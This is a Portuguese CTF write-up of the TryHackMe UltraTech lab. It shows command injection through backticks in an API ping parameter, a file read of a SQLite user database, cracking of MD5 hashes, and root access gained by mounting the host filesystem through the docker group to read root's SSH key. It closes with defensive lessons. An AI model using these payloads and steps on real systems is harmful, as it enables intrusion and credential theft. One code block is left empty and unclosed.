# TryHackMe — UltraTech

> **Writeup de CTF da plataforma TryHackMe.**
> Documento com fins **exclusivamente educacionais**. Técnicas aplicadas em ambiente controlado e autorizado.
> Use este material apenas para estudo. Testar sistemas sem autorização é crime.

---

##  Visão Geral

| Campo | Valor |
|:------|:------|
| **Máquina** | UltraTech |
| **Plataforma** | TryHackMe |
| **IP Alvo** | `<Ip>' |
| **Sistema Operacional** | Ubuntu (Linux) |
| **Dificuldade** | Medium |
| **Objetivo** | Enumerar serviços, explorar a API REST, obter acesso e escalar para root |

A máquina simula uma aplicação web com **API REST em Node.js/Express** e um **frontend Apache** na porta 31331. O caminho de exploração combina:

1.  **Command Injection** na API REST (`/ping?ip=`) via *backticks*.
2.  **Leak de credenciais** em um arquivo SQLite exposto.
3.  **Quebra de hash MD5** com rockyou.
4.  **Escalação via grupo `docker`** — um dos vetores mais clássicos de PrivEsc em Linux.

**Cadeia de ataque resumida:**

```
nmap ─▶ API 8081 (Node.js) ─▶ Command Injection (backticks)
                                        │
                              Leak de banco SQLite (.db)
                                        │
                              Hash MD5 ─▶ crackstation/rockyou
                                        │
                              Login SSH (r00t) ─▶ Grupo docker
                                        │
                              Container + /hostOS ─▶ chave SSH do root
                                        │
                                       🏁 root
```

---

##  Reconhecimento

### Varredura de portas

```bash
nmap -sV -sC -p- <IP>
```

**Resultado:**

```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8081/tcp open  http    Node.js Express framework
31331/tcp open http   Apache 2.4.29 (Ubuntu)
```

**Observações:**

- **21/tcp (FTP)** — `vsftpd 3.0.5`. Verificar se permite login anónimo e se há arquivos interessantes.
- **22/tcp (SSH)** — OpenSSH 8.2p1. Alvo potencial para reutilização de credenciais após o leak.
- **8081/tcp (Node.js/Express)** — API REST. **Forte candidato a Command Injection** em endpoints que recebem parâmetros.
- **31331/tcp (Apache)** — Frontend web. Útil para descobrir quais endpoints a API expõe.

---

##  Enumeração da API (Porta 8081)

### Fuzzing de rotas

```bash
ffuf -u http://<IP>:8081/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
```

**Rotas encontradas:**

```text
/auth
/ping
```

- **`/auth`** — Endpoint de autenticação (provavelmente retorna um token).
- **`/ping`** — Endpoint de diagnóstico de rede. **Forte suspeita de Command Injection.**

---

##  Análise do Frontend

Na porta **31331**, o frontend Apache serve o site principal. Ao inspecionar os arquivos JavaScript (`/js/...`), observamos chamadas para os endpoints da API:

```text
GET /auth
GET /ping
```

Isso confirma que o frontend consome a API na porta 8081, e que `/ping` é acessível publicamente. É o **ponto de entrada** da exploração.

---

##  Exploração da API

### 4.1 Erro revelador no `/ping`

```bash
curl "http://<Ip>:<Porta>/ping"
```

**Resultado:**

```text
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    ...
```

**Análise:**

- O endpoint `/ping` espera um parâmetro `ip`.
- A mensagem de erro revela o **caminho do código-fonte**: `/home/www/api/index.js`.
- O uso de `.replace()` sugere que a aplicação tenta sanitizar a entrada, mas **sem o parâmetro, o valor é `undefined`** — o que causa o erro.
- **Conclusão:** o parâmetro `ip` é passado para um comando do sistema, e a sanitização é provavelmente insuficiente.

### 4.2 Injeção de comando com backticks

```bash
curl "http://<Ip>:<Porta>/ping?ip=`id`"
```

**Resultado:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

 **Confirmação de Command Injection** — o servidor executou o comando `id` e retornou o output. O payload usou **substituição de comando** com backticks (`` ` ``), que é interpretado pelo shell antes de executar o comando principal.

> **Por que backticks funcionam aqui?** O código provavelmente faz algo como `exec("ping -c 1 " + ip)`. Quando `ip` contém `` `id` ``, o shell substitui `` `id` `` pelo output do comando e depois executa. É uma das técnicas mais clássicas de Command Injection.

### 4.3 Listagem de arquivos

```bash
curl "http://<IP>:<Porta>/ping?ip=`ls`"
```

**Resultado:**

```text
***.db.***
```

Foi encontrado um arquivo de **banco de dados SQLite** (extensão `.db`) no diretório da aplicação.

### 4.4 Leitura do banco de dados

```bash
curl "http://<**.***.**.**>:8081/ping?ip=`cat ***.db.***`"
```

**Resultado:**

```text
<usuário1> <hash1>
<usuário2> <hash2>
```

O banco continha **dois usuários e seus hashes**. O formato dos hashes (32 caracteres hexadecimais) indica **MD5**.

---

##  Quebra de Hash

Os hashes encontrados eram **MD5** (rápidos de quebrar). Três abordagens possíveis:

### Opção 1: Hashcat com rockyou

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

- `-m 0` especifica o modo **MD5**.
- `rockyou.txt` é a wordlist clássica.

### Opção 2: John the Ripper

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-md5 hash.txt
```

### Opção 3: CrackStation (online)

Para hashes MD5 comuns, o site [crackstation.net](https://crackstation.net/) consulta uma base de dados gigante de hashes pré-computados e retorna a senha em segundos.

**Senhas recuperadas:**

```text
<usuário1>   →  <senha_encontrada>
<usuário1> →  <senha_encontrada>
```

> 💡 **Por que MD5 é inseguro?** MD5 é um algoritmo de hash **rápido** e **sem salt**. Isso permite que GPUs testem bilhões de hashes por segundo. Para armazenamento de senhas, o correto é usar **bcrypt**, **scrypt** ou **Argon2** (lentos e com salt).

---

## Tentativa de Login (FTP/SSH)

Com as credenciais recuperadas, testamos os serviços expostos.

### 6.1 FTP

```bash
ftp <Ip>
# usuário: r00t
# senha: <senha_encontrada>
```

O FTP pode permitir upload/download de arquivos. Verificar se há arquivos interessantes ou se é possível escrever no webroot.

### 6.2 SSH

```bash
ssh <usuário1>@<Ip>
# senha: <senha_encontrada>
```

 **Login SSH bem-sucedido** com o usuário `<Usuario1>`. Temos acesso inicial ao sistema.

```text
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

> 💡 **Nota:** o grupo `116(docker)` é um **forte indicador de escalação de privilégios**. Usuários no grupo `docker` podem executar containers que montam o sistema de arquivos do host — efetivamente equivalente a root.

---

##  Escalação de Privilégios

### 7.1 Verificação de grupos

```bash
id
```

**Resultado:**

```text
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

**Análise:** o usuário `r00t` pertence ao grupo **`docker`**. Este é um dos vetores de PrivEsc mais conhecidos em Linux — o daemon Docker roda como root e permite montar qualquer diretório do host dentro de um container.

### 7.2 Listagem de containers

```bash
docker ps -a
```

**Resultado:**

```text
CONTAINER ID   IMAGE   COMMAND                  CREATED       STATUS                     PORTS   NAMES
7beaaeecd784   bash    "docker-entrypoint.s…"   7 years ago   Exited (130) 7 years ago           unruffled_shockley
696fb9b45ae5   bash    "docker-entrypoint.s…"   7 years ago   Exited (127) 7 years ago           boring_varahamihira
9811859c4c5c   bash    "docker-entrypoint.s…"   7 years ago   Exited (127) 7 years ago           boring_volhard
```

Há três containers parados, todos baseados em `bash`. O container `unruffled_shockley` tem status `Exited (130)` — sinal de que foi encerrado manualmente (SIGINT), possivelmente durante uma configuração anterior.

### 7.3 Ver logs do container

```bash
docker logs unruffled_shockley
```

Os logs revelam que, dentro do container, o **sistema de arquivos do host está montado em `/hostOS`**. Isso é uma configuração típica de containers de manutenção ou backup, mas representa uma **falha grave de segurança** — qualquer usuário no grupo `docker` pode acessar o filesystem do host como root.

### 7.4 Ler a chave SSH do root

```bash
docker run -v /:/hostOS -it bash
# ou, se o container já existe:
docker start -ai unruffled_shockley
```

Dentro do container:

```bash
cat /hostOS/root/.ssh/id_rsa
```

**Resultado:** a chave privada SSH do usuário `root` do host.

**Uso da chave:**

```bash

---

## Lições Aprendidas

### Vulnerabilidades exploradas

| # | Vulnerabilidade | Impacto |
|:--|:--|:--|
| 1 | **Command Injection** em `/ping?ip=` | RCE como `www-data` |
| 2 | **Banco SQLite exposto** no webroot | Leak de usuários e hashes |
| 3 | **Hash MD5 sem salt** | Quebra trivial via rockyou/crackstation |
| 4 | **Reutilização de credenciais** (DB → SSH) | Acesso ao sistema |
| 5 | **Grupo `docker`** atribuído ao usuário | Escalação para root via container |

### Boas práticas para o defensor

- **Nunca** passe entrada do usuário para `exec()`, `system()` ou `child_process.exec()` em Node.js. Use `execFile()` com lista de argumentos ou valide rigorosamente (ex.: regex para IPv4).
- **Não armazene bancos de dados** no webroot. Use diretórios fora da raiz web e restrinja permissões.
- **Nunca use MD5 ou SHA1** para senhas. Use **bcrypt**, **scrypt** ou **Argon2** com salt.
- **Evite reutilização de credenciais** entre serviços (DB, SSH, FTP). Use senhas distintas e um gerenciador de segredos.
- **Nunca adicione usuários ao grupo `docker`** sem necessidade. O grupo `docker` é **equivalente a root** — trate-o como tal.
- **Restrinja montagens de volumes** em containers. Não monte `/` do host em containers de manutenção.

### Por que o grupo `docker` é perigoso

O daemon Docker roda como `root` e permite que qualquer membro do grupo `docker`:

- Monte qualquer diretório do host em um container (`-v /:/hostOS`).
- Execute comandos como root dentro do container, que **enxerga o filesystem do host**.
- Leia `/etc/shadow`, chaves SSH, ou simplesmente execute `chroot /hostOS` para obter um shell root no host.

**Mitigação:** remova usuários do grupo `docker`. Se precisar de acesso a containers, use **rootless Docker** ou **Podman** com mapeamento de UID.

---

##  Ferramentas Utilizadas

| Ferramenta | Uso |
|:--|:--|
| **nmap** | Descoberta de portas e serviços |
| **ffuf** | Fuzzing de rotas da API |
| **curl** | Interação com a API e injeção de comandos |
| **hashcat** | Quebra de hash MD5 |
| **john the ripper** | Alternativa para quebra de hash |
| **crackstation** | Quebra online de hashes comuns |
| **docker** | Escalação de privilégios via container |

---


